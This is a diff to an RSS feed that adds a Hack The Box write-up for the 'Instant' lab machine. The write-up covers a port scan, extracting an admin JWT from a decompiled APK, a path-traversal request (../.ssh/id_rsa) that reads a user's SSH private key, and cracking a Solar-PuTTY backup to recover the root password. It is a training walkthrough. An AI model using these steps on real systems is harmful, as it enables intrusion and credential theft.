@@ -2051,5 +2051,150 @@ user:15fd56e82fde**********
 </code></pre></div>]]></content>
         </item>
         
+        <item>
+            <title></title>
+            <link>https://v3l1d.github.io/posts/instant/</link>
+            <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+            
+            <guid>https://v3l1d.github.io/posts/instant/</guid>
+            <description>Port Scanning nmap -sC -sV -A -T4 -o port_scan 10.10.11.37 Nmap scan report for 10.10.11.37 Host is up (0.055s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA) |_ 256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519) 80/tcp open http Apache httpd 2.4.58 |_http-server-header: Apache/2.4.58 (Ubuntu) |_http-title: Did not follow redirect to http://instant.htb/ Device type: general purpose Running: Linux 5.</description>
+            <content type="html"><![CDATA[<p><img src="attachment/504cbbbf52112e416f8f6f16a708a590.png" alt=""></p>
+<h3 id="port-scanning">Port Scanning</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r">nmap <span style="color:#f92672">-</span>sC <span style="color:#f92672">-</span>sV <span style="color:#f92672">-</span>A <span style="color:#f92672">-</span>T4 <span style="color:#f92672">-</span>o port_scan <span style="color:#ae81ff">10.10.11.37</span>
+Nmap scan report for <span style="color:#ae81ff">10.10.11.37</span>
+Host is <span style="color:#a6e22e">up </span>(<span style="color:#ae81ff">0.055</span>s latency).
+Not shown<span style="color:#f92672">:</span> <span style="color:#ae81ff">998</span> closed tcp <span style="color:#a6e22e">ports </span>(reset)
+PORT   STATE SERVICE VERSION
+<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp open  ssh     OpenSSH <span style="color:#ae81ff">9.6</span>p1 Ubuntu <span style="color:#ae81ff">3</span><span style="color:#a6e22e">ubuntu13.5 </span>(Ubuntu Linux; protocol <span style="color:#ae81ff">2.0</span>)
+<span style="color:#f92672">|</span> ssh<span style="color:#f92672">-</span>hostkey<span style="color:#f92672">:</span> 
+<span style="color:#f92672">|</span>   <span style="color:#ae81ff">256</span> <span style="color:#ae81ff">31</span><span style="color:#f92672">:</span><span style="color:#ae81ff">83</span><span style="color:#f92672">:</span>eb<span style="color:#f92672">:</span><span style="color:#ae81ff">9</span>f<span style="color:#f92672">:</span><span style="color:#ae81ff">15</span><span style="color:#f92672">:</span>f8<span style="color:#f92672">:</span><span style="color:#ae81ff">40</span><span style="color:#f92672">:</span>a5<span style="color:#f92672">:</span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">9</span>c<span style="color:#f92672">:</span>cb<span style="color:#f92672">:</span><span style="color:#ae81ff">3</span>f<span style="color:#f92672">:</span>f6<span style="color:#f92672">:</span>ec<span style="color:#f92672">:</span><span style="color:#ae81ff">49</span><span style="color:#f92672">:</span><span style="color:#ae81ff">76</span> (ECDSA)
+<span style="color:#f92672">|</span>_  <span style="color:#ae81ff">256</span> <span style="color:#ae81ff">6</span>f<span style="color:#f92672">:</span><span style="color:#ae81ff">66</span><span style="color:#f92672">:</span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">47</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>e<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>a<span style="color:#f92672">:</span>e0<span style="color:#f92672">:</span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">97</span><span style="color:#f92672">:</span><span style="color:#ae81ff">67</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span>b<span style="color:#f92672">:</span><span style="color:#ae81ff">41</span><span style="color:#f92672">:</span>cf<span style="color:#f92672">:</span>e2<span style="color:#f92672">:</span>c7<span style="color:#f92672">:</span><span style="color:#a6e22e">c7 </span>(ED25519)
+<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp open  http    Apache httpd <span style="color:#ae81ff">2.4.58</span>
+<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header<span style="color:#f92672">:</span> Apache<span style="color:#f92672">/</span><span style="color:#ae81ff">2.4.58</span> (Ubuntu)
+<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title<span style="color:#f92672">:</span> Did not follow redirect to http<span style="color:#f92672">://</span>instant.htb<span style="color:#f92672">/</span>
+Device type<span style="color:#f92672">:</span> general purpose
+Running<span style="color:#f92672">:</span> Linux <span style="color:#ae81ff">5</span>.X
+OS CPE<span style="color:#f92672">:</span> cpe<span style="color:#f92672">:/</span>o<span style="color:#f92672">:</span>linux<span style="color:#f92672">:</span>linux_kernel<span style="color:#f92672">:</span><span style="color:#ae81ff">5.0</span>
+OS details<span style="color:#f92672">:</span> Linux <span style="color:#ae81ff">5.0</span>
+Network Distance<span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span> hops
+Service Info<span style="color:#f92672">:</span> Host<span style="color:#f92672">:</span> instant.htb; OS<span style="color:#f92672">:</span> Linux; CPE<span style="color:#f92672">:</span> cpe<span style="color:#f92672">:/</span>o<span style="color:#f92672">:</span>linux<span style="color:#f92672">:</span>linux_kernel
+
+<span style="color:#a6e22e">TRACEROUTE </span>(using port <span style="color:#ae81ff">993</span><span style="color:#f92672">/</span>tcp)
+HOP RTT      ADDRESS
+<span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">54.27</span> ms <span style="color:#ae81ff">10.10.14.1</span>
+<span style="color:#ae81ff">2</span>   <span style="color:#ae81ff">54.47</span> ms <span style="color:#ae81ff">10.10.11.37</span>
+</code></pre></div><h3 id="apk-analysis">APK Analysis</h3>
+<p><img src="attachment/77a9ed10882f906d9e25817c321e1a2e.png" alt=""></p>
+<p>Download <strong>instant.apk</strong> and open it through <strong>JADX</strong></p>
+<p><img src="attachment/b4a3310b3d9a6c37b48ea5abceb16cb5.png" alt=""></p>
+<p>Is signed an API: <strong>/api/v1/view/profile</strong> associated to <strong>mywalletv1.instant.htb</strong>, add this subdomain to <strong>/etc/hosts/</strong>. In the autorhization header we have a JWT Token:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<span style="color:#f92672">**********</span>
+</code></pre></div><p>Try to contact the API providing the JWT token:</p>
+<p><img src="attachment/56e479b5143e43554b43834fd47bfbb9.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTTP" data-lang="HTTP"><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Wed, 27 Nov 2024 10:57:42 GMT</span>
+Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Werkzeug/3.0.3 Python/3.12.3</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">236</span>
+Keep-Alive<span style="color:#f92672">:</span> <span style="color:#ae81ff">timeout=5, max=100</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">Keep-Alive</span>
+
+{
+   <span style="color:#f92672">&#34;Profile&#34;</span>:{
+      <span style="color:#f92672">&#34;account_status&#34;</span>:<span style="color:#e6db74">&#34;active&#34;</span>,
+      <span style="color:#f92672">&#34;email&#34;</span>:<span style="color:#e6db74">&#34;admin@instant.htb&#34;</span>,
+      <span style="color:#f92672">&#34;invite_token&#34;</span>:<span style="color:#e6db74">&#34;instant_admin_inv&#34;</span>,
+      <span style="color:#f92672">&#34;role&#34;</span>:<span style="color:#e6db74">&#34;Admin&#34;</span>,
+      <span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;instantAdmin&#34;</span>,
+      <span style="color:#f92672">&#34;wallet_balance&#34;</span>:<span style="color:#e6db74">&#34;10000000&#34;</span>,
+      <span style="color:#f92672">&#34;wallet_id&#34;</span>:<span style="color:#e6db74">&#34;f0eca6e5-783a-471d-9d8f-0162cbc900db&#34;</span>
+   },
+   <span style="color:#f92672">&#34;Status&#34;</span>:<span style="color:#ae81ff">200</span>
+}
+
+</code></pre></div><p>Looking deeper in apk&rsquo;s source code:</p>
+<p><img src="attachment/7d59b53a5de20dba595454f9a5901146.png" alt=""></p>
+<p>Let&rsquo;s add this domain to /etc/hosts and we&rsquo;ll get the accesso to swagger-ui:</p>
+<p><img src="attachment/ed549b0eaba7fc96a67fd26e5c7731c9.png" alt=""></p>
+<p>As we can see some apis are locked, but we can unlock them using the JWT token found in the source code of the <strong>apk</strong>:</p>
+<p><img src="attachment/fe72cdf91a5b8d6dcd7bd6dc3da5e0a1.png" alt=""></p>
+<p>By clicking on <strong>Authorize</strong> button we&rsquo;ll be able to unlock all apis in the swagger and going under <strong>Logs</strong> section:</p>
+<p><img src="attachment/6489e7b31d07142da4ac3bc60e46f79c.png" alt=""></p>
+<p>Through the api: <strong>/api/v1/admin/read/log?log_file_name=1.log</strong> we are able read files' content:</p>
+<p><img src="attachment/60bc89f506fcfa153688152cd7e10220.png" alt=""></p>
+<p>Pass the request in Burp and try include sensible files. Injecting <strong>../.ssh/id_rsa</strong> into <strong>log_file_name</strong> parameter we are able to read <strong>shirohige</strong>&rsquo;s SSH private key:</p>
+<p><img src="attachment/993417cd9496bbef357fc9255d4f6fbd.png" alt=""></p>
+<h3 id="initial-access">Initial Access</h3>
+<p>Let&rsquo;s fix the <strong>id_rsa</strong>&rsquo;s format in VSCode replacing all spaces and useless characters:</p>
+<p><img src="attachment/e12537eb0b597dd64c4c0a5e4ce4e79d.png" alt=""></p>
+<p>Fix <strong>id_rsa</strong> permission and use to break in shirohige&rsquo;s SSH:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="color:#f92672">-----</span>BEGIN OPENSSH PRIVATE KEY<span style="color:#f92672">-----</span>
+    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+    .....
+    <span style="color:#f92672">-----</span>END OPENSSH PRIVATE KEY<span style="color:#f92672">-----</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r">┌──(kali㉿kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">~/</span>HTB<span style="color:#f92672">/</span>Instant]
+└─<span style="color:#f92672">$</span> chmod <span style="color:#ae81ff">600</span> id_rsa
+</code></pre></div><p><img src="attachment/5b44635c699b9705e3761a3c36bd4d30.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">userflag:092473a67eb7a**********
+</code></pre></div><h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>I ran <strong>LinPeas</strong> looking for something allowing privesc and it found:</p>
+<p><img src="attachment/b90c5fb4b8b4274ba018f5e25047a1a3.png" alt=""></p>
+<p>I downloaded <strong>instant.db</strong> and opened it through <a href="https://inloop.github.io/sqlite-viewer/">SQLite Viewer</a> :</p>
+<p><img src="attachment/29d32cfb01b73d9c2ed2f526d23dfa0f.png" alt=""></p>
+<p>I tried to crack vanessa&rsquo;s and admin&rsquo;s passwords, but didn&rsquo;t succeeded. Going back to linpeas output i noted that there is a file in <strong>/opt/backups/Solar-PuTTY</strong>:</p>
+<p><img src="attachment/10b16d0c87ad2586375ca7870f252738.png" alt=""></p>
+<p>Analyzing file content we have:</p>
+<p><img src="attachment/7f7056b0fe0d1e977c4f46457cf01cd4.png" alt=""></p>
+<p>It seems to be a sessions backup file from SolarPuTTY, which may contains useful information about SSH sessions, such as usernames or passwords. After a long research on google i found two useful tools to crack thi <strong>.dat</strong>:</p>
+<p>-<a href="https://github.com/Ak4izZ/SolarPuttyCracker">SolarPuttyCracker</a> for Linux
+-<a href="https://github.com/VoidSec/SolarPuttyDecrypt/tree/master">SolarPuTTYDecrypt</a> for Windows</p>
+<p>I used the first one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r">┌──(SolarPuttyCracker<span style="color:#f92672">-</span>HSs_2f3g)─(kali㉿kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">~/</span>HTB<span style="color:#f92672">/</span>Alert<span style="color:#f92672">/</span>SolarPuttyCracker]
+└─<span style="color:#f92672">$</span> python3 SolarPuttyCracker.py ..<span style="color:#f92672">/</span>sessions<span style="color:#f92672">-</span>backup.dat <span style="color:#f92672">-</span>o ..<span style="color:#f92672">/</span>sessions_cracked <span style="color:#f92672">-</span>w <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>rockyou.txt 
+</code></pre></div><p>After running the command, in the output file we&rsquo;ll get all SSH sessions, with clear credentials, including root password:</p>
+<p><img src="attachment/31a58751d6d2385c5aa1fecde806e4d7.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+    <span style="color:#f92672">&#34;Sessions&#34;</span>: [
+        {
+            <span style="color:#f92672">&#34;Id&#34;</span>: <span style="color:#e6db74">&#34;066894ee-635c-4578-86d0-d36d4838115b&#34;</span>,
+            <span style="color:#f92672">&#34;Ip&#34;</span>: <span style="color:#e6db74">&#34;10.10.11.37&#34;</span>,
+            <span style="color:#f92672">&#34;Port&#34;</span>: <span style="color:#ae81ff">22</span>,
+            <span style="color:#f92672">&#34;ConnectionType&#34;</span>: <span style="color:#ae81ff">1</span>,
+            <span style="color:#f92672">&#34;SessionName&#34;</span>: <span style="color:#e6db74">&#34;Instant&#34;</span>,
+            <span style="color:#f92672">&#34;Authentication&#34;</span>: <span style="color:#ae81ff">0</span>,
+            <span style="color:#f92672">&#34;CredentialsID&#34;</span>: <span style="color:#e6db74">&#34;452ed919-530e-419b-b721-da76cbe8ed04&#34;</span>,
+            <span style="color:#f92672">&#34;AuthenticateScript&#34;</span>: <span style="color:#e6db74">&#34;00000000-0000-0000-0000-000000000000&#34;</span>,
+            <span style="color:#f92672">&#34;LastTimeOpen&#34;</span>: <span style="color:#e6db74">&#34;0001-01-01T00:00:00&#34;</span>,
+            <span style="color:#f92672">&#34;OpenCounter&#34;</span>: <span style="color:#ae81ff">1</span>,
+            <span style="color:#f92672">&#34;SerialLine&#34;</span>: <span style="color:#66d9ef">null</span>,
+            <span style="color:#f92672">&#34;Speed&#34;</span>: <span style="color:#ae81ff">0</span>,
+            <span style="color:#f92672">&#34;Color&#34;</span>: <span style="color:#e6db74">&#34;#FF176998&#34;</span>,
+            <span style="color:#f92672">&#34;TelnetConnectionWaitSeconds&#34;</span>: <span style="color:#ae81ff">1</span>,
+            <span style="color:#f92672">&#34;LoggingEnabled&#34;</span>: <span style="color:#66d9ef">false</span>,
+            <span style="color:#f92672">&#34;RemoteDirectory&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>
+        }
+    ],
+    <span style="color:#f92672">&#34;Credentials&#34;</span>: [
+        {
+            <span style="color:#f92672">&#34;Id&#34;</span>: <span style="color:#e6db74">&#34;452ed919-530e-419b-b721-da76cbe8ed04&#34;</span>,
+            <span style="color:#f92672">&#34;CredentialsName&#34;</span>: <span style="color:#e6db74">&#34;instant-root&#34;</span>,
+            <span style="color:#f92672">&#34;Username&#34;</span>: <span style="color:#e6db74">&#34;root&#34;</span>,
+            <span style="color:#f92672">&#34;Password&#34;</span>: <span style="color:#e6db74">&#34;**********&#34;</span>,
+            <span style="color:#f92672">&#34;PrivateKeyPath&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+            <span style="color:#f92672">&#34;Passphrase&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+            <span style="color:#f92672">&#34;PrivateKeyContent&#34;</span>: <span style="color:#66d9ef">null</span>
+        }
+    ],
+    <span style="color:#f92672">&#34;AuthScript&#34;</span>: [],
+    <span style="color:#f92672">&#34;Groups&#34;</span>: [],
+    <span style="color:#f92672">&#34;Tunnels&#34;</span>: [],
+    <span style="color:#f92672">&#34;LogsFolderDestination&#34;</span>: <span style="color:#e6db74">&#34;C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs&#34;</span>
+}                                 
+</code></pre></div><p>Use contained root password to login in it and catch the flag:</p>
+<p><img src="attachment/84594a655a1f071ca4fbed41ef516d6a.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rootflag:727938c0341**********
+</code></pre></div>]]></content>
+        </item>
+        
     </channel>
 </rss>
